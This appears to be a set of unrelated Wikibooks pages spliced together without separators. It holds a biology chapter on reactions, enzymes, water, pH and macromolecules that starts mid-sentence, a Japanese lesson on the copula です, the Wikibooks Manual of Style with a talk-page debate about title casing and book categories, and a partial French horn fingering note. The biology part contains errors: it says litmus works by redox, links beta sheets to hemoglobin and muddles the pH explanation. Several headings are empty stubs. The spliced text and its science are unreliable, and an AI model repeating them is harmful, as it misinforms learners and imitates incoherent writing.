The problem, however, is that not all reactions - including this one - will occur unless energy is added to fuel the reaction. The energy needed for such a reaction to occur is called the &lt;b&gt;activation energy&lt;/b&gt;, or threshold energy. In the water reaction above, we would have to combust (burn) both gases (when mixed together) to produce water, the end result. The combustion, in this case, provides the activation energy needed to fuel the reaction.

Reactions can also be classified and categorized based on their relationships with the energy involved. &lt;b&gt;Endergonic reactions&lt;/b&gt; absorb energy in the process; &lt;b&gt;exergonic reactions&lt;/b&gt; release energy in the process. The general form for an endergonic reaction is:

&lt;center&gt;&lt;math&gt;\hbox{energy} + \hbox{A} \to \hbox{B}&lt;/math&gt;&lt;/center&gt;

and the general form for an exergonic reaction is:

&lt;center&gt;&lt;math&gt;\hbox{A} \to \hbox{B} + \hbox{energy}&lt;/math&gt;&lt;/center&gt; 

=== Enzymes ===
Some reactions can be &lt;i&gt;catalyzed&lt;/i&gt; - sped up - to overcome the 'barrier' set by activation energy. To do so, a &lt;b&gt;catalyst&lt;/b&gt; is introduced - a substance that lowers the activation energy of a reaction but does not chemically affect either the reactants or the products. In biology, catalysis is usually carried out by specialized proteins called &lt;b&gt;enzymes&lt;/b&gt;. Enzymes contain a region called an &lt;b&gt;active site&lt;/b&gt;; when the reactants (also referred to as &lt;b&gt;substrates&lt;/b&gt;) interact with the active site, they bind to the site (this is called the &lt;b&gt;enzyme-substrate complex&lt;/b&gt;) and undergo an alternate reaction that requires less energy. The enzyme then releases the substrates, which have combined to form the product.

==Water==
The wonderful properties of water. 

'''Cohesion'''
Cohesion is an intermolecular attraction between like molecules, and is useful in describing why certain liquids (such as water) have peculiar properties like surface tension (which create a skin like barrier between the air and the water.) 

'''Adhesion'''
Adhesion is the attraction of liquid molecules to other surfaces, this can be contrasted to cohesion which is the intermolecular attraction. 

'''Capillary Action'''
When adhesive forces are stronger than cohesive force, liquids can actually travel against the force of gravity, this is particularly useful when describing xylem in plant tissues and blood vessels. What aides in having adhesive forces stronger than cohesive forces is the fact that the path the liquid travels is very narrow, this creates a proportional lessening of cohesion (intermolecular bonds) to adhesion, attraction to the conduit of the liquid.   

'''Heat capacity'''
Also known as thermal capacity is the ability of matter to store heat, it is usually measured as the heat energy (joules) used to create a 1 Kelvin increase in a particular object.

==Acid/Base==
Acids are substances that have a higher concentration of H+ ions relative to the concentration of OH- ions (example: acetic acid - CH3COOH). Conversely, bases are substances that have a higher concentration of OH- ions relative to the concentration of H+ ions (example: sodium hydroxide). The strength of acids and bases is determined by how much they dissociate in water. Neutral pH water has a H+ concentration of 10 ^ -7. The addition of an acid would actually increase the hydrogen ion concentration even though the pH would become 10 ^ (value less than 7). This can be explained by the fact that the smaller the exponent, the larger the value. Thus, if the pH of a substance changes by 1, then it becomes 10 times more acidic or basic. There are three definitions of acids and bases (will be explained in the section below). 

Acid Base / pH

The letters pH stand for &quot;power of hydrogen&quot;

One can measure pH using either litmus paper (which changes color using reduction/oxidation reactions) or a metal probe (where the substance will make electrons move toward or away from the probe).


The common Silver-Silver Chloride reference electrode used with most combination pH electrodes has a Potassium Chloride salt-bridge which is saturated with Silver Chloride.

There's a helpful outline of the topic available [[General Biology/Getting Started/Chemical Building Blocks of Life|here]].

==Organic Elements==
Of the 92 natural elements, 25 are essential for life.  Of these, there are six main elements that are the fundamental building blocks of life.  They are, in order of least to most common: sulfur, phosphorous, oxygen, nitrogen, carbon, and hydrogen.  An easy way to remember this is SPONCH - a nice mnemonic.  The remaining 19 elements are defined as trace elements, which are important, but required only in very small quantities.
The basis of life is carbon.  Carbon's importance comes mainly from the enormous variety of structures that it can form due to its unusual four valence electrons.  Most important of these structures is the carbon chain, which forms the &quot;backbone&quot; of fatty acids and carbohydrates, among other organic molecules.  Other elements do share properties similar to carbon, in this regard.  However, they are not as prevalent on earth as carbon.

==The Four Macromolecules==
All life is composed mainly of the four macromolecule building blocks: carbohydrates, lipids, proteins, and nucleic acids.  The interactions of different polymers of these basic molecule types make up the majority of life's structure and function.

===Carbohydrates===
Overview - all Carbohydrates contain these three elements (usually in a 1:2:1 ratio) carbon, hydrogen, and oxygen.

:'''Monosaccharides''' - the simplest form of carbohydrates, contains one sugar. These are the basic energy sources for living cells. Examples of monosaccharides are glucose and fructose. 

:'''Disaccharides''' - two monosaccharides bonded by a glycosidic bond (formed by dehydration synthesis). One example is maltose, which is specifically two glucose bonded together. 

:'''Polysaccharide''' - three or more monosaccharides (in repeated units). These are most complex form of carbohydrates. A polysaccharide is a type of polymer. Some examples of polysaccharides, which are commonly used as energy storage molecules in cells, are starch, glycogen, and cellulose.

Dehydration synthesis / Hydrolysis

===Proteins===
Proteins are the most abundant of the organic molecules, comprising about 50% of a cell's dry weight.  The most basic monomer of a protein is the amino acid.  Amino acids share a common structure; all consist of a carbon atom  bonded to a carboxyl group, and amino group, a hydrogen atom, and a variable R group.  A particular protein's overall conformation can be considered on four levels; primary structure, secondary structure, tertiary structure, and quaternary structure.  These levels of structure combine to create a complete protein that may serve many different functions within a cell.

====Amino Acid Structure and Function====
Amino acids are the most basic units of a polypeptide.  They are comprised of four parts; the alpha carbon, the amino group, the carboxyl group, and finally an R group.

Expound on carboxyl-amino peptide bonds, R group types and interactions

====Levels of Structure====
Protein structure is influenced on four levels; primary, secondary, tertiary, and quaternary.

''Primary''

:The primary structure is simply the arrangement of amino acids in a single polypeptide chain.  This is the part of a protein that is directly coded for by DNA.


''Secondary''

:The secondary structure is the interaction of the amino acids that make up the primary structure.  The most common examples of secondary structure in a polypeptide are the α helix and the β pleated sheet.  Most secondary structure is determined by intermolecular interactions between the carboxyl groups and the amino groups of amino acids, interacting to form Structural Biochemistry, Chemical Bonding and Hydrogen bonds.  α helices are most commonly found in fibrous proteins such as those that make up hair and muscles.  β pleated sheets, due to their strength and density, are commonly found in globular proteins like hemoglobin.


''Tertiary''

:The tertiary structure is highly irregular.  It occurs as a result of interactions between the R groups, amino acid side chains, and the aqueous environment.  These interactions create the individual conformation of a particular polypeptide chain.  The most common interactions include hydrogen bonds, ionic bonds, and hydrophobic interactions.  The strongest bonds, however, are due to covalent linkage, usually between two R groups.  The most prevalent example of covalent linkage is the disulfide bridge.


''Quaternary''

:The quaternary structure of a protein describes the interactions between multiple polypeptide chains.  Quaternary interactions can only occur in proteins with more than one polypeptide chain.

====Functions of Proteins====
1.  '''Structural Support'''

2.  '''Storage'''

3.  '''Transport'''

4.  '''Signaling'''

5.  '''Cellular Response to Chemical Stimuli'''

6.  '''Movement'''

7.  '''Defense Against Foreign Organisms'''

8.  '''Catalysis of Biochemical Reactions'''

===Lipids===
structure and function, ester bonds,etc 

====Types of Lipids====
saturated, unsaturated, trans fat

====Properties of Lipids====
hydrophobic and philic, use of in cell

====Steroids====
Steroids are a family of organic compounds whose multiple rings share carbons. Sports players use steroids  to strengthen their muscles. In most competition due to the performance boosting effect they are morally regarded as an unfair advantage and some of the compounds are listed as illegal. 
structure, use in membrane, use as hormones

===Nucleic Acid===
DNA or nucleic acids (structure)

== Lesson ==
=== What is a copula? ===

In English, the verb 'to be' serves two purposes: It acts as the copula, and it acts as the verb for existence. However, in many languages, including Japanese, these two verbs are separate—so it helps to have an understanding of the difference between the two usages.

A copula can be thought of as an equals sign: it equates two things to each other. In the sentence &quot;That is a dog,&quot; 'is' is the copula. In the sentence &quot;The dog is inside,&quot; you don't mean that 'the dog' and 'inside' are the same thing; you mean that the dog exists inside.

These two usages have different verbs in Japanese, so it'd be good to get used to it now. Here are some examples:

Using 'to be' as a copula:
* That man is the president.
* Joe is a salesman.
* The dog is a golden retriever.
* This paper is my report.

Using 'to be' to mean existence:
* Sara is outside.
* The plate is on the table.
* The watch is on my wrist
* They are at the mall.
* There is John.

=== The Japanese Copula ===

In Japanese, です is the copula.  It is used to equate two things.  Let's look into translating the sentence, &quot;This is a dictionary,&quot; into Japanese.

Since Japanese uses subject-object-verb word order, the copula (and all other verbs) come ''last'' in the sentence. If we were to form the English sentence in this way, it'd go like this: &quot;This a dictionary is.&quot;  If we directly translate the words to Japanese and throw in a particle to separate and denote the function of the words in the sentence, then we'll be done.

The word 'is', as I mentioned above, becomes です.  We can use これ and じしょ for 'this' and 'dictionary', respectively.  In this instance, これ is our subject (actually our topic), so we add the topic particle は after it (the direct-object, dictionary, does not need a particle when used with the copula.)  Now, our sentence is &quot;これはじしょです。&quot;, which is a complete, understandable Japanese sentence.

=== Review ===

* AはBです。- A is B, A is a B.

The '''Wikibooks Manual of Style''' serves to establish good structural and stylistic practices to help editors produce higher quality wikibooks. 

== Wikibook titles ==
: ''See also [[Wikibooks:Naming policy]] for information on how to name books and their chapters.''

Wikibooks should be titled based on their ''aspect''. This is a combination of the target audience, scope, and depth of the book. Several books on one topic but with differing aspects can exist. For example, a book on woodwork aimed at the general public may be entitled simply &quot;Woodworking&quot;, and a mathematics text for commerce students may be called &quot;Mathematics for Commerce&quot; or &quot;Commercial Mathematics&quot; instead of simply &quot;Mathematics&quot;.

Some people prefer to use [[wikt:title case|title casing]] like books often do, while other people prefer to use [[wikt:sentence case|sentence casing]] like Wikipedia does. Title casing is recommended for [[Wikibooks:Naming policy|''book titles'']] as it reduces the potential conflict between title- and subject-[[Wikibooks:Categories|categories]]. Casing on ''[[Help:Editing#Subpage links|subpage]] names'' and ''[[Help:Editing#Sections|sections]]'' is entirely a matter of style. Whatever combination of schemes for book titles, pages and sections, please be consistent and follow the existing style for books you are editing.

Sub-page names that describe what the chapter is about &amp;mdash; for example, &quot;&lt;tt&gt;[[Chess/Notating_The_Game]]&lt;/tt&gt;&quot; &amp;mdash; are preferred over numbered chapters &amp;mdash; like &quot;&lt;tt&gt;Chess/Chapter_10&lt;/tt&gt;&quot; &amp;mdash; so that inserting new chapters in between existing chapters, or reordering chapters, requires less work.

== Structure ==
: ''See also [[w:book design|book design]] for some helpful tips and ideas.''

=== Main page ===
The main page is generally the first page a new reader sees.  It should give a quick overview of the scope, intended audience and layout of the book.  [[w:Splash screen#Splash_pages|Splash pages]] should be avoided.  Often the layout is simply the full table of contents.  Collections, printable versions and PDF files should be easily accessible from this page.

Links to the book from the [[Wikibooks:Card Catalog Office|card catalog office]] and external websites should point to a book's main page. The subject index on the card catalog office requires the {{tl|subjects}} template to be placed on the main page of the book. The book's main page and category should be placed in any [[Wikibooks:Categories|categories]] that the book belongs to. Indicate a book's completion status with {{tl|status}} to provide readers with an idea of how far along the book is when browsing the [[Subject:Books by subject|subject pages]]. If you still require help with categorizing a book, please [[WB:HELP|request assistance in the reading room]].

Interlingual links should be placed on the book's main page. Books across language projects may be dissimilar even when about the same subject. Be wary about placing interlingual links on any other pages.

=== Table of contents ===
In general, the table of contents should reside on the main page, giving readers an overview of the available material. In cases where this is impractical, a special page can be created for it. Common names for such pages are &lt;tt&gt;''Contents''&lt;/tt&gt;, &lt;tt&gt;''Table of contents''&lt;/tt&gt; or similar.

&lt;gallery widths=&quot;64px&quot; heights=&quot;64px&quot; caption=&quot;table of contents examples&quot;&gt;
File:Wikibooks standard toc.svg|Standard TOC
File:Wikibooks 2col toc.svg|2 column TOC
File:Wikibooks 2col toc2.svg|2 column TOC
&lt;/gallery&gt;

=== Introduction ===
An [[w:Introduction (essay)|introduction]] page is the first page where learning begins. A book's introduction page commonly delves into purpose and goals of the book; what the book aims to teach, who the audience is, what the book's scope is, what topics the book covers, history of the subject, reasons to learn the subject, any conventions used in the book, or any other information that might make sense in an introductory chapter. Common names for such pages are &lt;tt&gt;''Introduction''&lt;/tt&gt; or &lt;tt&gt;''About''&lt;/tt&gt;. The latter is more commonly used when information about the book is split from the introduction of the subject matter.

The [[Help:Local manuals of style|local manual of style]]—when it is not part of the &lt;tt&gt;''Introduction''&lt;/tt&gt; page -- is often named literally &quot;Local style manual&quot;, &quot;Manual of style&quot;, &quot;How to contribute&quot;, &quot;How you can help&quot;, &quot;About&quot;, etc. &amp;mdash; appended to the book name, of course.
Whatever it is called in the book you are editing, it would be nice if a link to it is on the same page as the table of contents.
Having a local manual of style is further discussed in [[WB:LMOS]].

=== Navigation ===
{{see also|Wikibooks:Templates/Navigation}}

Navigation aids are links included on pages to make navigating between pages easier. Navigation aids can help make reading books easier for readers, but can also make maintaining and contributing to books harder. Most web browsers can back track through pages already visited, and the wiki software also adds links for navigating back to the table of contents if pages use the slash convention in their name and a book's main page is the table of contents as suggested. Using a book-specific template to hold navigation aids (rather than copy-and-paste onto each page of the book) can help reduce some of the maintenance issues, since only that template must be edited if things change. There is no standard for navigation aids. Navigation aids are optional due to their potential drawbacks.

=== Bibliography ===
A [[wikt:bibliography|bibliography]] is useful for collecting resources that were cited in the book, for linking to other useful resources on the subject that go beyond the scope of the book, and for including works that can aid in verifying the factual accuracy of what is written in the book.  When used, such pages are commonly named &lt;tt&gt;''Further Reading''&lt;/tt&gt;, &lt;tt&gt;''References''&lt;/tt&gt;, or similar.

=== Glossary ===
A [[w:glossary|glossary]] lists terms in a particular domain of knowledge with the definitions for those terms. A glossary is completely optional and is most useful in books aimed at people new to a field of study. &lt;tt&gt;''Glossary''&lt;/tt&gt; should always be used for such a page.

=== Appendices ===
An [[wikt:appendix|appendix]] includes important information that does not quite fit into the flow of a book.  For example a list of math formulas might be used as an appendix in a math book.  Appendices are optional and books may have more than one appendix.  Examples of common ways to name appendices are &lt;tt&gt;'''Appendix/Keywords'''&lt;/tt&gt; and &lt;tt&gt;'''Appendix:Formulas'''&lt;/tt&gt;.

Examples:

* [[Conlang/Appendix/Glossary]]
* [[Inkscape/Appendix:Reference]]

=== Cover pages ===
Cover pages are useful for print versions. These should be separated from the main page (remember: Wikibooks is not paper) but can be used to make print versions.
When used, commonly named &lt;tt&gt;''Cover''&lt;/tt&gt;.

=== Print versions ===
See [[Help:Print versions]] for more on print versions.  They are often named &lt;tt&gt;''Book Name/Print version''&lt;/tt&gt;.

=== PDF versions ===
Some books have a &lt;tt&gt;''File:Bookname.pdf''&lt;/tt&gt; for the entire book at once in a single PDF file.
If someone creates a PDF version of a book, it would be nice if that PDF file were mentioned at [[Wikibooks:PDF versions]], and {{tlx|PDF version}} were placed on the table of contents to link to that PDF file.

=== Examples ===
* [[Control Systems]] has a great introduction describing (and linking to some of) the prerequisites for this book.
* [[Spanish]] uses a splash page, but the table of contents is well annotated and accessible.
* [[Haskell]] has a very nice layout sectioned off for audiences of different levels.

== Style ==
Where appropriate the first use a word or phrase akin to the title of the page should be marked in '''bold''' and when a new term is introduced, it is ''italicised''.

=== Headers ===
{{see also|Help:Editing#Sections}}
Headers should be used to divide page sections and provide content layout.  Primary information should be marked with a &lt;nowiki&gt;&quot;==&quot;&lt;/nowiki&gt;, and information secondary to that should be marked with a &lt;nowiki&gt;&quot;===&quot;&lt;/nowiki&gt; header, and so on, for example:

 == Animals ==
 There are many kinds of animals.
 
 === Cats ===
 Cats are animals.
 
 === Dogs ===
 Dogs are animals.

There is no need to provide systematic navigation between headers; only provide navigation between pages. A list of sections is automatically provided on the page when more than 3 headers are used.

=== Linking ===
{{see also|Help:Editing#Links}}

Books with a deep sub-page hierarchy should include navigation links to help navigate within the hierarchy. [[Help:Templates|Templates]] can help maintain consistency by making it easy to include navigational aids on the necessary pages.

=== Footnotes and references ===
{{see also|Help:Editing#References}}

Wikibooks has a couple of really simple implementations for footnotes and references. One uses {{tl|note}} to place notes at the bottom of the page and {{tl|ref}} to reference these at appropriate places in the text. The other places the references between &lt;nowiki&gt;&lt;ref&gt; and &lt;/ref&gt;&lt;/nowiki&gt; tags right in the text, and then uses the {{tl|reflist}} or &lt;nowiki&gt;&lt;references /&gt;&lt;/nowiki&gt; to automatically generate a list of these at the bottom of the page.

=== Mathematics ===
{{see also|Help:Formulas}}
Format using HTML or in-line Mediawiki markup when using variables or other simple mathematical notation within a sentence. Use &lt;nowiki&gt;&lt;math&gt;&lt;/math&gt;&lt;/nowiki&gt; tags for more complicated forms.

Use italics for variables: ''a''+''b'', etc. Do not use italics for Greek letter variables, function names, or their parenthesis.

To introduce mathematics notation in a ''display'' format, move to the start of the new line, add a single colon, and then the notation within the &lt;nowiki&gt;&lt;math&gt;&lt;/math&gt;&lt;/nowiki&gt; tags. If punctuation follows the notation, do so ''inside'' the tags.

For example:
{| class=&quot;wikitable&quot; width=&quot;100%&quot;
! width=&quot;50%&quot; | Markup !! Display
|-
|&lt;source lang=&quot;tex&quot; inline&gt;
: &lt;math&gt;\int_0^\infty {1 \over {x^2 + 1}}\,dx = \frac{\pi}{2}&lt;/math&gt;
&lt;/source&gt;
|
: &lt;math&gt;\int_0^\infty {1 \over {x^2 + 1}}\,dx = \frac{\pi}{2}&lt;/math&gt;
|}
is correctly used for &quot;display&quot; guidelines.

If a notation does not render as a PNG, you may force it to do so by adding a &quot;&lt;tt&gt;\,\!&lt;/tt&gt;&quot; at the end of the formula.

=== Software ===
Books that are about computer software or rely on the use of computer software to illustrate examples should clearly indicate which version of the software is relevant to the book, page, or section at hand. Templates to help with this and examples of their usage is available at [[Wikibooks:Templates/General#Software Versions|Wikibooks:Templates]].

Is the &quot;title category&quot; mentioned in this manual of style the same as what [[Wikibooks:Categories]] calls a &quot;book category&quot;?

This manual of style briefly mentions &quot;the potential conflict between title- and subject-categories.&quot;
and seems to actively encourage creating a title category and a subject category that differ only in their capitalization.

However, many people -- even people that recommend capitalizing different kinds of things differently -- strongly discourage creating two names that differ only in their capitalization.

For example:
&quot;don't use the same word for a namespace name and a classname and don't choose variable names which differ from each other only by capitalization&quot; -- [http://www-glast.slac.stanford.edu/software/CodeHowTo_20021202/codeStandards.html &quot;GLAST Ground Software Standards: A Start&quot;].
&quot;No two file names that differ only in capitalization&quot;. -- [http://dokuwiki.squid-cache.org/dev/squid3codingguidelines &quot;Squid 3 coding style guidelines&quot;].
&quot;it's very easy to mis-read, or indeed mis-type words that differ only by case.&quot; -- [http://stackoverflow.com/questions/461231/am-i-immoral-for-using-a-variable-name-that-differs-from-its-type-only-by-case/461256 Stack Overflow].
&quot;Splint reports identifiers that differ only in alphabetic case. ... useful to check that internal names are more distinct then required by the compiler to minimize the likelihood that identifiers are confused in the program.&quot; -- [http://www.splint.org/manual/html/sec12.html &quot;Secure Programming Lint&quot; manual].

Is there a way to adjust this manual of style so it discourages (or at least does not encourage) creating a title category and a subject category that differ only in their capitalization?
Preferably a way that avoids [[:meta:instruction creep|instruction creep]] ?

--[[User:DavidCary|DavidCary]] ([[User talk:DavidCary|talk]]) 05:25, 17 June 2009 (UTC)

: I can see how it might be confused this way. What is meant is that since the book name and the book category are suppose to use the same casing, the book should use title casing in order to avoid conflicts with subject categories. I don't think anyone is suggesting the names should differ only in capitalization. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 11:42, 20 June 2009 (UTC)

:: I agree that the book category should differ in *more* than just capitalization from any subject category. As far as I know, that is currently true at Wikibooks. As long as that is true, it is impossible for a book category to &quot;conflict&quot; with any subject category, no matter how either one of them is capitalized.
:: A special style rule whose only reason for existing is to prevent such impossible &quot;conflicts&quot; seems like [[:meta:instruction creep|instruction creep]] to me.
:: Alas, I have seen someone suggest ([[Talk:Computer_Programming#book_name]]) a subject category and a book category that differ in only one letter's capitalization.  --[[User:DavidCary|DavidCary]] ([[User talk:DavidCary|talk]]) 19:26, 22 June 2009 (UTC)

::: Conflicts are possible and they do happen. There is currently no requirements in place to prevent or address conflicts when they happen. I don't think adding requirements to prevent conflicts is instruction creep. I would prefer to go even further by adding a lot of requirements, because I think not having anything to say on the matter is a source of some problems. Some of the things I'd like to see include:

:::# Book names must use title case. No lowercase, uppercase or mixed case titles.
:::# Book names must be more descriptive then just the name of the subject because multiple books on a subject are allowed. Be precise.

I doubt that there would be any objections to items 2, 4 and 9.&lt;br&gt;
I don't like the items 1 and 7 mostly because of esthetic's and can't see a good enough reason for them in Wikibooks (a software solution could be requested and applied were problems may ariser).&lt;br&gt;
Item 3 is problematic and can be addressed without a rule in a case by case or in a more watered down version &quot;must not be used&quot; is to hard for this issue, or create a list of exceptions.  I will address this point in one of the books I'm editing as it seems reasonable to simplify the title.&lt;br&gt;
The same on item 8 &quot;must use&quot;, &quot;should use&quot; since it depends on items 10 and 11, I can't remember an existing  issue with this items and ruling on them would reduce creativity/freedom on naming the books.&lt;br&gt;
As I understand item 5 I'm strongly opposed this has a negative impact on the structure of bigger books, I would agree that it can be annoying to have unnecessary sub-sectioning in smaller projects but any project is just that a project not a finished work so I don't see how to fix it without creating a barrier to the projects development.&lt;br&gt;
I don't fully understand item 6 to comment on it but looking to the simplification I strongly object to it, one must remember that books are stand alone projects that will exist outside of the Wikibooks context...&lt;br&gt;
In any case if at the end of the discussion no one objects to item 2, 4 and 9 we should get a proposal, those items will already create a lot of cleanup work.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 19:51, 25 June 2009 (UTC)

: I support : ''Book names must be more descriptive then just the name of the subject because multiple books on a subject are allowed. Be precise.'' However, I hear that [[Wikibooks:Reading_room/Archives/2009/August#Maintenance | Thenub314 says single word titles are often appropriate]].
: In general, I am opposed to instructions that don't help. I am opposed to instructions that don't actually solve any problems.
: I am opposed to &quot;Book names must use title case&quot;, because
: (a) Some authors prefer sentence case, and their wishes should not be overridden for no good reason. (b) The only reason given above and on the [[Wikibooks:Manual of Style]] for forcing those authors to use title case is to ''&quot;avoid conflicts between a 'book category' and a 'subject category'&quot;''. (c) As [[Talk:Using Wikibooks/Subjects, Categories, and Classifications#Title Case vs Sentence Case | Jomegat pointed out]], even if all books used title case, it still wouldn't ''&quot;avoid conflicts between a 'book category' and a 'subject category'&quot;'' -- in particular, in the case of one-word book titles. (d) Once any rule is adopted that prevents conflicts between one-word 'book category' and one-word 'subject category', that rule alone fixes the alleged &quot;problem&quot; caused by sentence-case book titles. (Two or three such rules have already been proposed [http://en.wikibooks.org/wiki/Wikibooks:Reading_room/Archives/2009/August#Naming_conventions] [http://en.wikibooks.org/wiki/Wikibooks:Reading_room/Archives/2008/May#Categories_Overlapping]). Once the problem is fixed, then the &quot;Book names must use title case&quot; rule is unnecessary. --[[User:DavidCary|DavidCary]] ([[User talk:DavidCary|talk]]) 23:25, 7 September 2009 (UTC)

::In this case we seem to be in agreement, probably [[User:Darklama]] or [[User:Adrignola]] (since he has been doing work on the categories and subjects) could help clarify if this is really indispensable and so why. Or it should be made a default standard without a particular obligation. In any case I can only see the manual of style being adopted as a guideline, that in itself provides avenues for non compliance if justified.
::One thing that is related to this and should be incorporated in the BeBold is that page moves and page renames, as any action on any book project that changes the book's adoption of styles (those covered on this proposal or others, as an example changes to the templates used) shouldn't fall under that guideline and should always require at least a first attempt to find consensus by posting a proposal on the book's talk page.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 23:41, 7 September 2009 (UTC)

:::I don't agree with Panic on changes to a book's title or the templates it uses.  That is a personal position on the matter and I see no exception listed for page moves or template changes.  I don't care to turn Wikibooks into a bureaucracy where every change to a book has to go through a committee and be approved before it can be implemented.  If someone wants to improve a book they're not going to wait six months for the three people (if that many) who might still be working on a book to come around and notice a comment posted to a talk page.

:::This issue is about a resolvable as bookshelves and subjects and I'm frankly tired of rehashing it.  You've got my comments on all the talk pages linked above and I'll summarize by saying that I agree with the current manual of style guidelines.  If a book category and subject category are both trying to use a single word, the book category must append &quot;(book)&quot; after it to distinguish it from the other.  This complicates things by making it so the simple {{tlx|BookCat}} template cannot be used.  If people would simply use a title of two words, using title case, to avoid conflicts with a subject category of two words using sentence case, there would be no problems.  This is not simply a matter of personal preferences!  If people put their book's pages into a subject category because the name conflicts, it screws up the corresponding subject page, listing book title pages as well as book subpages.  This may not matter to those of you who like bookshelves, but it breaks the subjects for those who like them and there have to be rules in place to keep things orderly.  I'm sorry if this limits flexibility for book authors but an individual book must respect the functioning of the community as a whole. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 14:40, 8 September 2009 (UTC)

::::From past discussions, I'm satisfied that if the name of a one-word book title is the same as the name of a subject category, then the book title is &amp;mdash; in practice &amp;mdash; guaranteed to be underdescriptive, and should be changed; if nothing else, probably it should indicate the level of the intended audience, like &quot;Basic Algebra&quot; or &quot;Introduction to Algebra&quot; instead of &quot;Algebra&quot;.

::::Personally, I think title case should always be used for book titles because it looks more uniform, thus less haphazard, and more professional, and therefore reflects well on the project.  (And no, I don't think this holds for chapter/section titles, except that they should be cased consistently within a single book, because chapters of different books aren't usually set next to each other for comparison.)

::::''However'', these positions ought to stand on their own, without leaning on the claim that they are needed because our technical category-naming conventions require them.  And, indeed, I submit that while they could lean on it in the short run, in the long run they cannot because it doesn't have to remain so.  Here is just one example (an existence proof) of an alternative book-category naming convention that would guarantee non-collision between book- and subject-categories, and that could be shifted to without discontinuity:  For a book with, say, [[Template:ROOTBOOKNAME|rootbookname]]&amp;nbsp; {{nowrap|&lt;code&gt;Wikijunior:Solar System&lt;/code&gt;}}, call its book-category&amp;nbsp; {{nowrap|&lt;code&gt;Category:Book/Wikijunior:Solar System&lt;/code&gt;}}.  For the transition from one convention to the other, first augment {{tl|ROOTBOOKNAME}} to handle book-category names of both old and new styles, then augment {{tl|BookCat}} to check for existence of a new-style book category.  After that, individual categories can be handled one at a time at our &quot;leisure&quot;.  (Refinement:  {{tl|BookCat}} ought to check for a new-style category, if found then use it, else check for an old-style category, if found then use it, else use the new-style category; and someday, when there are no more old-style book-categories, the expensive &lt;code&gt;#ifexists&lt;/code&gt; calls can be removed from the template.)  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 20:00, 8 September 2009 (UTC)


::::Regarding the need to exclude some tasks from the BeBold. Your argument that it adds bureaucracy is invalid, at most it would include a small delay and would provide a chance for others to oppose such radical moves. These can't be categorized as bureaucracy as it will not require administrative action, add complexity or impede effective action, just the opposite.
::::At least mentioning on this guideline a specific exclusion of changing book's adopted styles from BeBold would be beneficial, it would provide stability to works and reduce errors. We can address it in detail latter when a proposal to include those changes on the BeBold itself is made.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 20:05, 8 September 2009 (UTC)

Many people -- even people that recommend capitalizing different kinds of things differently -- strongly discourage creating two names that differ only in their capitalization.
Is there a way to adjust this manual of style and the [[Using Wikibooks/Subjects, Categories, and Classifications]] page so they discourage (or at least do not encourage) creating a title category and a subject category that differ only in their capitalization?
Someone once claimed that ''I don't think anyone is suggesting the names should differ only in capitalization.''.
However, &quot;[[Using Wikibooks/Subjects, Categories, and Classifications]]&quot; says
: ''&quot;... {{nowrap|[[:Category:Emergency Medicine]]}} acting as the book category ... and {{nowrap|[[:Category:Emergency medicine]]}} acting as the subject category ...&quot;''
which seems to suggest exactly that.
--[[User:DavidCary|DavidCary]] ([[User talk:DavidCary|discuss]] • [[Special:Contributions/DavidCary|contribs]]) 16:30, 23 May 2013 (UTC)

: Do you have anything new to add to the discussion? Otherwise this is just rehashing everything written above. As long as people choose to name books after subject names and prefer to organize books by subject this is going to be a problem. The manual of style recommends to use a descriptive name for books that includes the target audience, scope, and depth because multiple books on one subject are allowed and to name the book category after the book name. The problem only exists for books that don't follow the recommendation. The solution is to follow the recommendation. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 21:31, 23 May 2013 (UTC)

== Interesting in improving? ==

Is anyone else interested in refining this style guide to the point where it could be submitted as a proposal at some point? I couldn't go through every proposal archive, but I couldn't find any recent attempt. It's not as though I don't think this is a good start; I don't disagree with any of the major principles presented here. But I wonder if it might be worth it to more clearly define a few of the specific qualities expected in a Wikibook to a) create a more uniform experience and b) give new users a better resource to learn how to create and edit books correctly. Since the ''Chicago Manual of Style'' is often used as the go-to reference guide for book formatting, I'm willing to use that as a launching point for a few potential policies, but I'm not going to glue us to that. There is no need (at this time) to go as in-depth as the [[w:Wikipedia:Manual of Style|WP:MOS]], but things I'd like to do include:

* Adapting a similar policy regarding variations of the English language. In other words, use a consistent version throughout. If an article has a particular connection to a region, use that regional variety.
* Change &quot;Structure&quot; to &quot;Book Structure&quot;. As it is now, the Structure section contains information about the structure of a book as a whole as well as individual pages (i.e. Navigation), which makes it confusing for new users to determine exactly what goes on every page. This might best be fixed by dividing the new &quot;Book structure&quot; section into three sections: &quot;Front matter&quot;, &quot;main content&quot;, &quot;back matter&quot;, etc. If needed, we can add a &quot;Page structure&quot; section.
* Establishing a consensus between title and sentence case for chapter titles...maybe.
* Changing &quot;Bibliography&quot; to &quot;References&quot; in almost all cases. The latter is a more general term that encompasses all referenced materials. 
* Although I'm fine with having different ways to use references, we might want to have some clearer information on how to use them and remain consistent.
* Clarifying whether glossaries are counted as appendices, and if so, putting that section of the MOS in the correct place.
* I'd like to make many more smaller changes, and might go ahead and make a few that I'd consider noncontroversial, but this list is just sort of the beginning.

The horn spans four plus octaves depending on the player and uses both the treble and bass clefs. In this chart it is assumed the player is using a double-horn with F and Bb sides. The number 1 indicates that the index-finger valve should be depressed, the number 2 indicates that the middle-finger valve should be depressed and the number 3 indicates that the ring-finger valve should be depressed. There are eight possible valve combinations among the first, second and third valves: 0, 1, 2, 3, 1-2, 1-3, 2-3, and 1-2-3. However, there are effectively seven combinations, because 1-2 will produce the same notes, perhaps slightly out of tune, as 3 alone. One depresses the thumb key to use the Bb side of the horn.

== Systems ==


